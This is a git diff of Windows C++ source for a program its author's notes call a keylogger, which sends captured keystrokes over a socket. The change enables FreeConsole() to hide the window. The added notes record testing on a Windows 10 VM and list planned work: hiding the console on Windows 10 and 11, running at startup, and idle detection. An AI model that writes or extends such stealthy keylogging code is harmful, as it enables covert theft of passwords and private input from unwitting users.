@@ -43,7 +43,7 @@ void writeKeyStroke(int trueKey, SOCKET sObjC)
 int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
     PSTR lpCmdLine, int nCmdShow)
 {
-    //FreeConsole();
+    FreeConsole();
     SOCKET sObjClient = initClient();
     Maps vkMaps;
     vkMaps.initializeMaps();
@@ -83,11 +83,20 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
 /*
         Notes
     
+    test results and conclusion: 
+        * console window shows on w10 vm, closing still keeps the process running though.
+        * keylogger can run multiple instances, not only does this cause performance issues, but also ruins the integrity of the data.
+    
+    so far, these are the only issues I've found during testing. That and additional dll files are needed to run
+    independently. 
+    
 
         To-Do list
-
+    ~ hide console window on w10, and w11 machines. 
     ~ check documentation for ALL code files to ensure everything is written clearly, and concisely. 
     ~ write code to schedule this program to be run on startup.
-    ~ write code to make sure special keys are getting logged. 
+    ~ implement code algorithm to check if user is idle, if so then exit the loop and wait til mouse moves. 
 
+        Ideas
+    ~ implement code to check if user is idle, if so then exit the loop and wait til mouse moves. 
 */
